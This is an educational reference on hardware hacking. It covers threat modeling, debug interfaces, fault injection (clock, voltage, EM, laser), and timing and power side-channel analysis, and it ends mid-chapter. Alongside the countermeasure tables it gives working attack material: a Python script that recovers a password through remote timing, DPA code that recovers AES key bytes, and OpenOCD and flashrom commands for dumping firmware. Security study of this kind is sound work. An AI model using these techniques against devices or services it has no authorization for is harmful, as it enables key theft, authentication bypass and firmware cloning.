# Hardware Hacking

> **Scope:** Physical and electronic attack techniques against embedded systems, microcontrollers, SoCs, and cryptographic hardware. Covers threat modeling, electrical fundamentals, fault injection, side-channel analysis, and power analysis — from bench setup through data processing and visualization.

---

## Table of Contents

- [Chapter 1: Threat Modeling for Hardware Security](#chapter-1-threat-modeling-for-hardware-security)
- [Chapter 2: Electrical Fundamentals](#chapter-2-electrical-fundamentals)
- [Chapter 3: Fault Injection Attacks](#chapter-3-fault-injection-attacks)
- [Chapter 4: Timing and Power Analysis Attacks](#chapter-4-timing-and-power-analysis-attacks)
- [Chapter 5: Power Analysis — Practical Techniques](#chapter-5-power-analysis--practical-techniques)

---

## Chapter 1: Threat Modeling for Hardware Security

### Why Hardware Threat Modeling Differs

Software threat modeling assumes the attacker is remote and logical. Hardware threat modeling must also account for **physical access** — an attacker who can touch the device has capabilities unavailable over any network:

- Direct memory reads via debug interfaces (JTAG, SWD, UART)
- Signal probing on internal buses
- Voltage and clock manipulation to bypass security checks
- Chip decapping and microprobing
- Side-channel observation of power, EM emissions, and timing

The classic security model of "inside the trust boundary = trusted" collapses when an attacker can physically manipulate the hardware. Hardware threat modeling rebuilds the trust boundary from the silicon up.

---

### Attacker Profiles

Defining a realistic attacker profile before assessment scopes the attack surface and prevents both under- and over-engineering of defenses.

| Profile | Access Level | Budget | Skill | Time | Example |
|---------|-------------|--------|-------|------|---------|
| **Script Kiddie** | Physical device | <$100 | Low | Hours | Running published exploit against consumer device |
| **Motivated Hobbyist** | Physical device | $100–$1K | Medium | Days–weeks | Jailbreaking a game console |
| **Security Researcher** | Physical device + teardown | $1K–$10K | High | Weeks | Academic fault injection work |
| **Organized Criminal** | Physical device + supply chain | $10K–$100K | High | Months | Payment card skimming, ATM black-box attacks |
| **Nation-State** | Any access including supply chain | Unlimited | Expert | Years | IC-level implants, foundry-level compromise |

Use these profiles to bound your analysis. A consumer IoT device likely needs defenses against the Motivated Hobbyist and below; a HSM or satellite payload needs to consider Nation-State capabilities.

---

### Assets

Hardware assets differ from software assets because they are often **physical objects** whose compromise has physical consequences.

#### Asset Categories

| Category | Examples | Sensitivity |
|----------|---------|------------|
| **Cryptographic keys** | Root keys, device identity keys, session keys | Critical — disclosure often irrecoverable |
| **Firmware / IP** | Proprietary algorithms, product firmware | High — enables cloning, piracy, vulnerability research |
| **Configuration / fuses** | Security state bits, feature enables, calibration | High — manipulation enables bypass |
| **Runtime data** | PINs, passwords, intermediate crypto values | High — transient but frequently targeted |
| **Physical device** | PCB, chips, interfaces | Medium — extraction enables all other attacks |
| **Manufacturing data** | Test modes, debug interfaces, factory keys | High — often left active in production |

#### Asset-Attack Surface Mapping

```
Asset: AES Root Key
  └─> Stored in: OTP fuses / secure element / battery-backed SRAM
  └─> Used by: Crypto accelerator / software AES
  └─> Observable via: Power trace during encrypt/decrypt
  └─> Extractable via: SPA/DPA on crypto operations
                        Fault injection to skip key zeroization
                        JTAG if debug not locked
                        Glitching secure boot to unlock debug
```

---

### Objectives

Map attacker objectives to the assets they require and the attacks that enable them:

| Objective | Assets Required | Likely Attack Path |
|-----------|---------------|-------------------|
| **Clone device** | Firmware, device keys | JTAG extraction, SPI flash dump, fault injection to unlock |
| **Extract secret key** | Cryptographic keys | DPA/SPA, SEMA, microprobing |
| **Bypass authentication** | Auth logic, firmware | Fault injection (skip compare), UART console exploit |
| **Unlock debug interface** | Security fuse state | Voltage glitching to bypass fuse check, laser fault injection |
| **Persistent implant** | Firmware write access | Bootloader exploit, flash reprogramming after extraction |
| **Forge signatures** | Signing keys | DPA against signing operation |
| **Denial of service** | Power/clock inputs | Voltage spike, overclock |

---

### Countermeasures

Hardware countermeasures operate at multiple levels — silicon, firmware, and physical:

#### Silicon / Chip Level

| Countermeasure | Attacks Mitigated | Notes |
|----------------|------------------|-------|
| Active shield mesh | Microprobing, laser FI | Top-metal layer that triggers tamper on probe contact |
| Glitch detectors (voltage/clock) | Voltage and clock FI | On-die sensors; trigger zeroization or reset |
| PLL with frequency limits | Clock glitching | Reject CLK outside valid range |
| True Random Number Generator | Fault injection timing, DPA | Randomizes operation timing; adds noise to power trace |
| Redundant logic / dual-rail | Fault injection | Executing critical ops twice; comparison before acting |
| Memory encryption | Cold boot, bus probing | Transparent encryption of SRAM/Flash |

#### Firmware Level

| Countermeasure | Attacks Mitigated | Implementation |
|----------------|------------------|---------------|
| Secure boot chain | Firmware tampering | Cryptographic signature verification at each stage |
| Debug lock | JTAG/SWD extraction | Burn fuses; disable SWD in firmware; JTAG authentication |
| Key diversification | Key extraction | Derive device-unique keys from root + UID; limit blast radius |
| Anti-timing (constant-time ops) | Timing side-channel | Avoid data-dependent branches and memory access patterns |
| Masking | DPA | XOR sensitive intermediate values with random masks |
| Instruction shuffling | SPA, DPA | Randomize non-dependent operation order |
| Integrity checks | Fault injection | Verify results of critical operations; detect glitch artifacts |

#### Physical Level

| Countermeasure | Attacks Mitigated |
|----------------|------------------|
| Epoxy potting | Decapping, probing |
| Tamper-evident seals | Physical access detection |
| Enclosure intrusion detect | Fault injection rigs |
| PCB layer count increase | Bus probing complexity |
| BGA packaging (no exposed pads) | Test point probing |

---

### Threat Model Template

For each target device, document:

```
TARGET: [Device name / model]
ATTACKER PROFILE: [Relevant profiles and assumed capabilities]

ASSETS:
  - [Asset 1]: [Location] [Sensitivity]
  - [Asset 2]: [Location] [Sensitivity]

ATTACK SURFACE:
  - External interfaces: [UART, SPI, I2C, JTAG, USB, RF, etc.]
  - Power input: [Accessible? Filtering present?]
  - Clock input: [External crystal / internal RC / PLL]
  - Physical access: [Enclosure protection level]

THREAT SCENARIOS:
  [ID] [Threat] [Asset] [Attack Path] [Likelihood] [Impact]

COUNTERMEASURES:
  [ID] [Control] [Threats Mitigated] [Implementation Status]

RESIDUAL RISK:
  [Threats not fully mitigated and accepted rationale]
```

---

## Chapter 2: Electrical Fundamentals

### Voltage, Current, and Power

Understanding the relationships between electrical quantities is foundational for measurement, probing, and side-channel work.

| Quantity | Symbol | Unit | Relevance to Hardware Hacking |
|----------|--------|------|-------------------------------|
| Voltage | V | Volt (V) | Supply manipulation; signal levels; logic thresholds |
| Current | I | Ampere (A) | Power analysis; shunt resistor measurement |
| Power | P | Watt (W) | P = V × I; target of power analysis attacks |
| Resistance | R | Ohm (Ω) | V = I × R (Ohm's Law); shunt selection |
| Capacitance | C | Farad (F) | Decoupling caps; affects glitch shape propagation |
| Impedance | Z | Ohm (Ω) | AC equivalent of resistance; critical for RF/probing |

**Ohm's Law and Power:**

```
V = I × R        (voltage = current × resistance)
P = V × I        (power = voltage × current)
P = I² × R       (power through a resistor)
P = V²/R         (power across a resistor)
```

**Why it matters:** In power analysis, you insert a small shunt resistor (typically 1–100 Ω) in the power supply path and measure the voltage across it. By Ohm's Law, V_shunt = I × R_shunt — the voltage waveform across the shunt directly represents the instantaneous current draw of the target device.

---

### Logic Levels and Signaling

Different logic families use different voltage levels. Probing or injecting at the wrong level damages hardware or produces no result.

| Logic Family | VCC | Logic High (min) | Logic Low (max) | Notes |
|-------------|-----|-----------------|----------------|-------|
| 5V TTL | 5V | 2.0V | 0.8V | Legacy; common in older embedded |
| 3.3V LVTTL | 3.3V | 2.0V | 0.8V | Most common modern MCU I/O |
| 1.8V | 1.8V | 1.17V | 0.63V | Low-power SoCs, modern ARM |
| 1.2V / 1.0V | 1.2V / 1.0V | ~0.8 × VCC | ~0.2 × VCC | High-speed DDR, advanced nodes |
| CMOS | VCC | 0.7 × VCC | 0.3 × VCC | Rail-to-rail; noise margin = 0.2 × VCC |

**Level shifting:** When probing a 1.8V device with a 3.3V logic analyzer, use a level shifter or verify your tool's input protection. Many cheap logic analyzers assume 3.3V/5V and can be damaged — or silently corrupt captures — on 1.8V signals.

---

### Communication Interfaces

#### UART (Universal Asynchronous Receiver/Transmitter)

The most commonly found debug interface in embedded systems. Often provides a Linux shell or bootloader prompt.

```
Signal lines: TX, RX, GND (sometimes VCC)
Voltage: 3.3V most common; 5V on older hardware; 1.8V on newer SoCs
Framing: Start bit | 8 data bits | [Parity] | Stop bit(s)
Common baud rates: 9600, 38400, 57600, 115200, 230400, 921600
```

**Identification:**
- Look for 3–4 pin headers (VCC, GND, TX, RX) — often unpopulated in production
- Measure with oscilloscope or logic analyzer for periodic activity at boot
- Use `baudrate.py` or manual baud rate detection against captured transitions
- TX on the device = RX on your adapter (cross the connections)

**Attack value:** Boot logs, root shell access, U-Boot console with `nand read`/`tftp` commands for firmware extraction.

---

#### SPI (Serial Peripheral Interface)

Synchronous full-duplex bus. Dominant interface for external flash memory (firmware storage), EEPROMs, DACs, ADCs.

```
Signal lines: SCLK, MOSI (Master Out Slave In), MISO (Master In Slave Out), CS (Chip Select, active low)
Modes: CPOL/CPHA (0,0), (0,1), (1,0), (1,1) — set clock polarity and phase
Speed: Up to tens of MHz; typically 1–25 MHz for flash
```

**Flash chip targeting:**

```bash
# Read SPI flash with flashrom (in-circuit or removed)
flashrom -p ch341a_spi -r firmware_dump.bin

# Read with Bus Pirate
# Set SPI mode, correct speed and CPOL/CPHA for target chip
# Use flashrom or manual JEDEC commands (0x9F = Read ID, 0x03 = Read Data)

# Identify chip on board: check silkscreen, use JEDEC ID
# Common chips: W25Q series (Winbond), MX25L series (Macronix), GD25Q (GigaDevice)
```

---

#### I²C (Inter-Integrated Circuit)

Two-wire synchronous bus. Common for configuration EEPROMs, sensors, real-time clocks, PMICs.

```
Signal lines: SDA (data), SCL (clock) — both open-drain with pull-up resistors
Addressing: 7-bit or 10-bit device address (7-bit = 128 possible addresses)
Speed: Standard (100 kHz), Fast (400 kHz), Fast-Plus (1 MHz), High-Speed (3.4 MHz)
```

**Scanning and reading:**

```bash
# Linux i2ctools
i2cdetect -y 1          # Scan bus 1 for devices
i2cdump -y 1 0x50       # Dump all registers of device at 0x50
i2cget -y 1 0x50 0x00   # Read single register
i2cset -y 1 0x50 0x00 0xFF  # Write register (authorized testing only)
```

**Attack value:** EEPROM at 0x50–0x57 range often stores device configuration, keys, or calibration. PMIC at various addresses can be used for voltage fault injection via I²C commands on systems with software-controlled power rails.

---

#### JTAG (Joint Test Action Group)

IEEE 1149.1 standard debug and test interface. Provides direct CPU register access, memory read/write, and hardware breakpoints. The most powerful debug interface when accessible.

```
Signal lines: TCK (clock), TMS (mode select), TDI (data in), TDO (data out), TRST (reset, optional)
Protocol: State machine driven by TMS; TAP (Test Access Port) controller
```

**Identification techniques:**

- `JTAGulator` hardware tool — brute-forces JTAG pinout across candidate pins
- `UART-JTAG` combo: many boards expose both in the same header
- `OpenOCD` with probe (J-Link, ST-LINK, FTDI-based): auto-detect TAP chain

```bash
# OpenOCD — connect, halt, dump memory
openocd -f interface/jlink.cfg -f target/stm32f4x.cfg
# In telnet session:
halt
dump_image firmware_extract.bin 0x08000000 0x100000   # Flash base, 1MB

# JTAG boundary scan for hardware testing
# Can toggle GPIO pins, read logic levels without CPU involvement
```

**Security bypass:** On devices that "lock" JTAG via fuse or register, fault injection is sometimes used to skip the fuse-check routine at boot before the lock engages.

---

#### SWD (Serial Wire Debug)

ARM's 2-wire alternative to JTAG (SWDCLK, SWDIO + GND). Functionally equivalent for most purposes — provides full CoreSight debug access on Cortex-M devices.

```bash
# OpenOCD with SWD
openocd -f interface/cmsis-dap.cfg -f target/nrf52.cfg
# Same halt/dump commands as JTAG
```

---

### Measurement Equipment

#### Oscilloscope Selection for Hardware Hacking

| Parameter | Minimum | Recommended | Notes |
|-----------|---------|-------------|-------|
| Bandwidth | 100 MHz | 200–500 MHz | Must exceed target clock × 5 for clean edges |
| Sample rate | 1 GSa/s | 2–5 GSa/s | Nyquist: 2× bandwidth minimum |
| Memory depth | 1M pts | 10M–1G pts | Deep memory essential for long glitch captures |
| Channels | 2 | 4 | Trigger on one channel, measure on others |
| Vertical resolution | 8-bit | 12–14 bit | Critical for power analysis — 8-bit often insufficient |
| Triggering | Edge | Advanced (pattern, pulse width, serial decode) | Complex trigger conditions needed for glitch work |

**Recommended affordable options:**

- **Rigol DS1054Z** (~$350) — 4-channel, 50 MHz (hackable to 100 MHz), good memory depth. Baseline bench scope.
- **Rigol DS1104Z-S** — adds signal gen; useful for clock injection testing
- **Siglent SDS1204X-E** (~$400) — 200 MHz, 14 Mpts; better for RF work
- **PicoScope 6000E** — 12-bit ADC; excellent for power analysis

#### Shunt Resistors for Power Measurement

The shunt resistor goes **in series** with the target's power supply. Tradeoffs:

| Resistance | Voltage Drop at 50mA | Signal Amplitude | Loading Effect |
|------------|---------------------|-----------------|---------------|
| 1 Ω | 50 mV | Low — needs amplification | Minimal |
| 10 Ω | 500 mV | Good | Moderate — check target still operates |
| 100 Ω | 5V — exceeds supply | Too high | Significant — device won't run |

Rule of thumb: **R_shunt × I_max < 0.1 × V_supply**. For a 3.3V device drawing up to 100 mA, keep shunt below 3.3 Ω.

A **current probe** (e.g., Tektronix TCP0020) eliminates this loading concern but adds cost and bandwidth limitations.

#### Logic Analyzers

| Tool | Channels | Speed | Notes |
|------|----------|-------|-------|
| Saleae Logic 8 | 8 | 100 MHz | Best software ecosystem; protocol decoders |
| Saleae Logic Pro 16 | 16 | 500 MHz analog | Analog + digital; excellent for mixed-signal |
| DreamSourceLab DSLogic | 16 | 400 MHz | Lower cost; sigrok compatible |
| Bus Pirate 5 | Multi | ~1 MHz | Interactive; SPI/I2C/UART/JTAG all-in-one |
| Glasgow Interface Explorer | Multi | ~100 MHz | FPGA-based; highly scriptable |

> You already have the Bus Pirate 5 in your bench kit — pair it with a Saleae or DSLogic for capture when you need faster sampling than BP5's protocol interfaces allow.

---

### Signal Integrity Basics

Poor signal integrity is the most common cause of failed hardware hacking attempts (bad captures, missed glitches, corrupted data).

- **Ground loops:** Always connect probe ground to the target ground at the nearest point. Long ground leads act as antennas and inject noise.
- **Probe loading:** A ×10 scope probe has 10 MΩ input impedance — fine for most digital work. Active probes (1 MΩ or 50 Ω matched) needed for high-frequency or sensitive measurements.
- **Decoupling capacitors:** Target boards place decoupling caps (100nF ceramic) on power pins to suppress noise. For power analysis, you often **remove** the decoupling cap nearest the target IC to improve signal fidelity — the cap averages out the current transients you're trying to measure.
- **50 Ω termination:** For signals above ~100 MHz, use 50 Ω terminated probing to prevent reflections. Scope inputs should be set to 50 Ω mode.

---

## Chapter 3: Fault Injection Attacks

### Concept

Fault injection (FI) introduces a transient error into a target system at a controlled moment to cause incorrect behavior — most commonly to skip a security check, corrupt a comparison, or force a branch taken/not-taken.

The attacker's goal is **temporal and spatial precision**: the fault must hit the right logic, at the right clock cycle, to produce exploitable behavior rather than a crash.

```
Normal execution:
  Load compare value
  Compare PIN input vs stored PIN   ← security check
  Branch if not equal → REJECT
  [Access granted]

Faulted execution (skip the branch):
  Load compare value
  Compare PIN input vs stored PIN
  [FAULT INJECTED HERE — branch skipped]
  [Access granted]  ← attacker wins
```

---

### Fault Injection Methods

#### Clock Glitching

Introduce a glitch (shortened or extended clock pulse) into the target's clock line. The CPU executes an instruction in less time than it needs, producing incorrect results.

```
Normal clock:   _____|‾‾‾‾‾|_____|‾‾‾‾‾|_____|‾‾‾‾‾|_____
Glitched clock: _____|‾‾‾‾‾|_____|‾|_____|‾‾‾‾‾|_____
                                     ^
                                 Short pulse (glitch)
                                 CPU sees a "half cycle" —
                                 flip-flops sample wrong data
```

**Requirements:**
- Access to the clock signal (external crystal, oscillator, or PCB clock trace)
- FPGA or dedicated glitcher (ChipWhisperer, Glasgow, custom FPGA) to generate precisely timed narrow pulses
- Triggering mechanism to fire glitch at the right moment

**Practical setup:**

```
Crystal → [Mux / MOSFET switch] → Target CLK pin
              ↑
         FPGA glitch generator
         (triggered by UART TX, GPIO, or internal counter)
```

**Key parameters to sweep:**
- `offset` — clock cycles after trigger before firing glitch
- `width` — duration of the glitch pulse (often sub-nanosecond)
- `repeat` — number of consecutive glitch pulses

---

#### Voltage Glitching

Briefly drop (or spike) the supply voltage. Creates setup/hold time violations and logic errors similar to clock glitching, but attacks the power supply instead of the clock.

```
Normal VCC: ‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾
Glitched:   ‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾|_|‾‾‾‾‾‾‾‾
                               ^
                         Brief voltage drop
                         (100–500 mV, 1–100 ns)
```

**Implementation options:**

| Method | Equipment | Pros | Cons |
|--------|-----------|------|------|
| MOSFET crowbar | NMOS + FPGA | Simple, cheap | Hard to control glitch shape |
| ChipWhisperer glitch module | ChipWhisperer Lite/Pro | Purpose-built; calibrated | Cost |
| DAC-controlled power supply | Fast DAC + LDO | Precise control | Bandwidth limited |
| Capacitor discharge | Cap + switch | Very fast edges | Less repeatable |

**Critical:** The glitch must propagate through the target's power distribution network (PDN) to the sensitive logic. Bulk decoupling capacitors on the target board will absorb the glitch — **remove or bypass the nearest decoupling cap** to the target chip for best results.

---

#### Electromagnetic Fault Injection (EMFI)

A focused EM pulse induces transient currents in the target IC through inductive coupling, causing localized bit flips or logic faults without requiring physical contact to the supply or clock.

```
EM Probe (coil)
    ↕  (< 1mm standoff)
Target IC surface
```

**Advantages over voltage/clock glitching:**
- No electrical connection to target required — works on encapsulated or potted boards
- Spatially selective — target specific regions of the die
- Can fault through packaging material (up to several mm of plastic)

**Equipment:**

- **Riscure EM Fault Injector** — Professional; ~$15K+
- **ChipSHOUTER** (NewAE Technology) — Affordable research EMFI tool; ~$1K
- **DIY:** EMFI coil + high-voltage pulse generator + FPGA trigger; buildable for <$500 but requires careful tuning

**Practical tips:**
- Use an XY stage for repeatable positioning
- Start with the coil perpendicular to the PCB surface; tilt for sensitivity
- Sweep position across the IC surface systematically — optimal position is non-obvious
- Higher voltage = stronger fault but higher crash probability; sweep the parameter

---

#### Laser Fault Injection (LFI)

Focused laser light on the chip die generates electron-hole pairs in transistors, causing localized bit flips. Highest precision of all fault injection methods — can target individual cells.

**Requirements:**
- Decapped (delayered) chip — protective coating and packaging must be removed
- IR laser (1064 nm penetrates silicon from backside) or visible laser (requires thinned front side)
- Precision XY (optionally Z) stage
- Trigger synchronization

**Chip decapping:**

1. **Chemical:** Hot fuming nitric or sulfuric acid etches epoxy (not suitable for copper wire bonds — use only on aluminum)
2. **Mechanical:** Dremel + fine grinding; labor-intensive; risk of die damage
3. **Laser ablation:** Expensive equipment; most precise

**Backside vs. frontside:**

| Approach | Laser | Requirements |
|----------|-------|-------------|
| Frontside | 532 nm / 660 nm green/red | Remove/thin passivation |
| Backside | 1064 nm IR | Grind silicon to ~100 μm; flip chip |

**Attack flow:**
```
1. Decap chip
2. Mount on precision stage under laser optic
3. Obtain die photograph (optical microscope or SEM) for navigation
4. Identify target region (e.g., security fuse array, ROM, comparator)
5. Sweep laser position and timing against target operation
6. Observe output: expected fault behavior vs. crash vs. no effect
```

---

#### Body Biasing Injection (BBI)

A less well-known technique: a voltage pulse applied to the **substrate (body) contact** of the chip through the backside or exposed substrate, rather than through the power supply. Modulates transistor threshold voltages, causing logic faults.

**Advantages:**
- Does not require decapping (works through thinned or backside-polished chip)
- More spatially selective than voltage glitching, less equipment-intensive than laser
- Effective on FD-SOI and bulk CMOS processes

**Implementation:** Spring-loaded probe on chip backside + pulse generator. Positioning is critical — scan the die surface systematically as with EMFI.

---

### Injection Point Identification

Finding where and when to inject is often harder than the injection itself.

#### Temporal Targeting

The fault must arrive during execution of the vulnerable instruction. Strategies:

| Strategy | Method | When to Use |
|----------|--------|------------|
| **Fixed offset from trigger** | UART TX start bit, GPIO toggle, power-on reset | Deterministic code paths |
| **Side-channel correlation** | Align fault offset with power/EM signature of target instruction | Variable-latency paths |
| **Incremental sweep** | Automated sweep of offset in fine steps | Unknown target offset |
| **Loop amplification** | Fault inside a repeated loop — each iteration is another attempt | Crypto operations |

**Trigger sources:**

```
Hardware trigger: GPIO from target (e.g., "auth check starting" LED)
Power trigger: Sudden current change detected on shunt
UART trigger: Specific byte sequence in target's output
Time-after-reset: Fixed delay from VCC ramp (deterministic early boot)
Logic analyzer: Decode serial comms; trigger on specific transaction
```

#### Spatial Targeting

For EMFI and LFI, spatial position matters:

- **Die photographs** from published datasheets or delayered samples (ChipFail.com, silicon zoo)
- **Function mapping** — correlate die regions with observed fault effects (flash faults vs. CPU faults vs. secure enclave faults)
- **Systematic XY raster scan** — grid sweep with fixed timing; map fault rate by position

---

### Practical Injection Tips

**Start with the easiest method first.** Voltage glitching requires minimal equipment; try it before investing in EMFI or laser setups.

**Control your environment:**
- Temperature affects timing and threshold voltages — keep the target at a stable temperature (bench fan or Peltier)
- RF shielding improves EMFI repeatability; use a small Faraday enclosure around the test setup

**Automate everything:**
- Manual parameter sweeps are untenable — write a Python script to iterate offset, width, and voltage parameters, reset the target between attempts, capture and classify the result (success / crash / no effect)
- Use ChipWhisperer's Python API, or a custom OpenOCD + serial script

**Classify results carefully:**

| Result | Meaning | Action |
|--------|---------|--------|
| **Normal (expected output)** | No fault or fault missed | Adjust offset/width |
| **Crash / hang / no response** | Fault too strong or wrong location | Reduce width; adjust offset |
| **Unexpected output / partial data** | Fault too early or too late in target sequence | Fine-tune offset |
| **Target behavior (e.g., auth bypass)** | Fault hit the right instruction | Record all parameters; repeat to confirm |

**Build a fault map:** Plot fault type vs. (offset, width) as a 2D heatmap. Successful faults cluster — the "sweet spot" becomes visually clear.

```python
import numpy as np
import matplotlib.pyplot as plt

# fault_results[offset_idx][width_idx] = 0 (normal), 1 (crash), 2 (success)
fault_map = np.array(fault_results)
plt.imshow(fault_map, cmap='RdYlGn', aspect='auto')
plt.xlabel('Glitch Width (ns)')
plt.ylabel('Glitch Offset (cycles)')
plt.title('Fault Injection Parameter Map')
plt.colorbar(label='Result: 0=Normal, 1=Crash, 2=Success')
plt.show()
```

---

## Chapter 4: Timing and Power Analysis Attacks

### Introduction to Side-Channel Analysis

Side-channel attacks extract secret information from **physical observables** — time, power, electromagnetic emissions, acoustic noise, photon emission — that leak as a function of the data being processed.

Unlike fault injection (which modifies behavior), side-channel analysis is **passive observation**. The target device operates normally; the attacker observes.

```
Secret data (e.g., AES key)
       │
       ↓
CPU executes crypto operation
       │
       ├──> Logical output (ciphertext)       ← what the attacker is "supposed" to see
       │
       └──> Physical observables:             ← what side-channel exploits
              ├── Time taken to complete
              ├── Power consumed each cycle
              ├── EM field emitted each cycle
              └── (Acoustic, photonic, thermal...)
```

---

### Timing Attacks

#### Concept

If a security-sensitive operation (e.g., password comparison, RSA exponentiation) takes different amounts of time depending on the secret value or on secret-dependent branches, an attacker can recover the secret by measuring execution time.

**Classic example — non-constant-time string comparison:**

```c
// VULNERABLE: returns early on first mismatch
int check_password(const char *input, const char *stored) {
    while (*input && *stored) {
        if (*input++ != *stored++) return 0;  // Early return!
    }
    return (*input == *stored);
}
```

An attacker can recover the password one character at a time:
- Try all 256 values for the first character
- The correct first character takes slightly longer (comparison proceeds to byte 2)
- Repeat for each subsequent character

```python
import time, requests

def timing_attack_password(target_url, charset, known_prefix=""):
    results = {}
    for c in charset:
        guess = known_prefix + c + "A" * (MAX_LEN - len(known_prefix) - 1)
        start = time.perf_counter_ns()
        requests.post(target_url, data={"password": guess})
        elapsed = time.perf_counter_ns() - start
        results[c] = elapsed
    return max(results, key=results.get)  # Highest time = correct character
```

**Mitigation:** `hmac.compare_digest()` in Python, `crypto_verify_*` in libsodium, `timingsafe_bcmp()` in BSD libc — constant-time comparison regardless of data.

---

#### RSA Timing Attacks

Early RSA implementations used square-and-multiply exponentiation:

```
For each bit of the private exponent d:
    square the accumulator
    if bit == 1: multiply by base    ← extra operation when bit is 1
```

The total time correlates with the Hamming weight of `d`. With enough measurements and statistical analysis, the key bits leak. Countermeasure: **Montgomery ladder** (always square and multiply, discard one result) or **blinding** (randomize inputs before exponentiation).

---

#### Cache Timing (Software Side-Channel)

Modern CPUs' memory caches introduce data-dependent timing at the software level — relevant when analyzing embedded Linux systems or implementations running on application processors:

| Attack | Description | Example |
|--------|-------------|---------|
| **Flush+Reload** | Flush shared cache line; time victim access to determine if it accessed it | AES T-table key recovery |
| **Prime+Probe** | Fill cache set; measure eviction time after victim runs | Cross-VM key extraction |
| **Spectre / Meltdown** | Speculative execution leaves cache footprint | Memory disclosure across privilege boundaries |

---

### Simple Power Analysis (SPA)

SPA involves visually or manually analyzing a **single power trace** (or a small number of traces) to identify secret-dependent operations.

#### Concept

Power consumption of a digital circuit correlates with the data it processes:

- **Switching activity:** CMOS gates consume power only when switching (0→1 or 1→0). A byte of value 0xFF (all 1s) causes fewer transitions from previous all-1s state than a byte of value 0x00.
- **Hamming weight model:** Power ∝ number of 1-bits in the data being processed
- **Hamming distance model:** Power ∝ number of bits that change between consecutive operations

#### SPA on RSA

In RSA private key operations, the square-and-multiply algorithm produces visually distinct power signatures:

```
Power trace segment:

  Square   Multiply   Square   Square   Multiply   Square
  ████     ██████     ████     ████     ██████     ████
  
  bit=0    bit=1      bit=0    bit=0    bit=1      bit=0
```

A single well-captured power trace may directly reveal the private key bits from the amplitude/duration pattern of the multiply operations.

**Practical capture:**

```
Target: RSA signing operation on microcontroller
Setup:
  - 10 Ω shunt between VCC and MCU VDD pin
  - Oscilloscope probe across shunt
  - Trigger: GPIO high at start of RSA operation
  - Sample rate: 200 MSa/s (match to MCU clock)
  - Memory depth: deep enough for full operation

Capture one trace during a known signing operation.
Import to Python/MATLAB for visualization.
```

```python
import numpy as np
import matplotlib.pyplot as plt

# Load raw oscilloscope trace (CSV export)
trace = np.loadtxt('rsa_trace.csv', delimiter=',', usecols=1)
time_axis = np.loadtxt('rsa_trace.csv', delimiter=',', usecols=0)

plt.figure(figsize=(20, 4))
plt.plot(time_axis * 1e6, trace * 1000, linewidth=0.5)
plt.xlabel('Time (μs)')
plt.ylabel('Power (mW proxy)')
plt.title('RSA Private Key Operation — SPA Trace')
plt.grid(True, alpha=0.3)

# Annotate suspected square/multiply regions manually after visual inspection
plt.show()
```

---

### Differential Power Analysis (DPA)

DPA uses **statistical analysis across many traces** to extract secret key bits, even when individual traces are too noisy for visual analysis. Introduced by Kocher, Jaffe, and Jun in 1999; still valid against unprotected implementations.

#### Concept

DPA exploits the correlation between a hypothetical intermediate value (computed from a guess about part of the key) and the measured power consumption.

**Attack on AES-128 (first round, 1 byte of key):**

1. Collect N power traces while target encrypts N known plaintexts
2. For each of 256 possible values of key byte K[0]:
   a. Compute the hypothetical intermediate: `hyp = AES_Sbox[P[0] XOR K_guess]`
   b. Predict power: use Hamming weight of `hyp` as the predicted power sample
   c. Correlate predicted power values with measured trace samples across all N traces
3. The K_guess that produces the highest correlation (Pearson r) at the right sample index is the correct key byte
4. Repeat for all 16 key bytes (each independently)

```python
import numpy as np
from scipy.stats import pearsonr

def hamming_weight(x):
    return bin(x).count('1')

# AES S-Box
SBOX = [0x63, 0x7c, 0x77, ...]  # Full 256-entry table

def dpa_aes_byte(traces, plaintexts, byte_idx):
    """
    traces: (N, T) array — N traces, each T samples
    plaintexts: (N, 16) array — N plaintexts
    byte_idx: which key byte to attack (0-15)
    Returns: (256,) correlation array, one value per key guess
    """
    N, T = traces.shape
    correlations = np.zeros(256)
    
    for k_guess in range(256):
        # Compute hypothetical intermediate values
        hyp = np.array([
            hamming_weight(SBOX[plaintexts[i, byte_idx] ^ k_guess])
            for i in range(N)
        ])
        
        # Correlate with each trace sample; take max absolute correlation
        r_values = np.array([pearsonr(hyp, traces[:, t])[0] for t in range(T)])
        correlations[k_guess] = np.max(np.abs(r_values))
    
    return correlations

# The key byte guess with highest correlation is likely correct:
result = dpa_aes_byte(traces, plaintexts, byte_idx=0)
likely_key_byte = np.argmax(result)
print(f"Key byte 0: 0x{likely_key_byte:02X} (correlation: {result[likely_key_byte]:.4f})")
```

#### Minimum Trace Count

| Target Algorithm | Unprotected | First-Order Masking | Second-Order Masking |
|-----------------|------------|--------------------|--------------------|
| AES (no countermeasures) | 100–1,000 | N/A | N/A |
| AES (first-order masked) | N/A | 10,000–100,000 | N/A |
| AES (second-order masked) | N/A | N/A | 1M+ |
| RSA (no blinding) | 1 (SPA) | N/A | N/A |
| RSA (blinded) | 10,000+ (template) | N/A | N/A |

---

## Chapter 5: Power Analysis — Practical Techniques

### Measurement Setup

A clean measurement setup is more important than sophisticated analysis. Poor signal quality cannot be rescued in software.

#### Hardware Configuration

```
Target device power path (shunt insertion):

  Power Supply
       │
       ├── [Optional: remove nearest decoupling cap on target PCB]
       │
  [Shunt resistor: 10–33 Ω]
       │
  Target VDD pin
       │
  [Return path: clean GND to supply]

Oscilloscope connection:
  CH1: Differential across shunt (or single-ended with probe GND at shunt bottom)
  CH2 (trigger): GPIO output from target (e.g., high during crypto operation)
  Probe: ×1 setting (maximum sensitivity); 50 Ω termination if high frequency
```

**Amplification:** For small current devices (Cortex-M0 at low clock speeds), the power signal across a 10 Ω shunt may be only 1–5 mV. Add a low-noise amplifier (e.g., Stanford Research SR560, or a purpose-built CW amplifier) with 20–40 dB gain between the shunt and oscilloscope.

**ChipWhisperer Lite setup:**

```python
import chipwhisperer as cw

scope = cw.scope()
target = cw.target(scope)

scope.default_setup()
scope.gain.gain = 45          # 45 dB amplification
scope.adc.samples = 5000      # Sample count per trace
scope.adc.offset = 0          # Offset from trigger
scope.adc.basic_mode = "rising_edge"
scope.clock.clkgen_freq = 7.37e6  # Target clock frequency
scope.io.tio1 = "serial_rx"
scope.io.tio2 = "serial_tx"
scope.trigger.triggers = "tio4"  # Trigger on GPIO

target.baud = 38400
```

---

### Trace Acquisition

#### Collection Best Practices

- **Interleave plaintext randomization:** Use a CSPRNG for plaintext generation, not sequential values — sequential plaintexts introduce artificial correlation patterns
- **Temperature stability:** Let the bench warm up 15–30 minutes; temperature drift causes trace misalignment
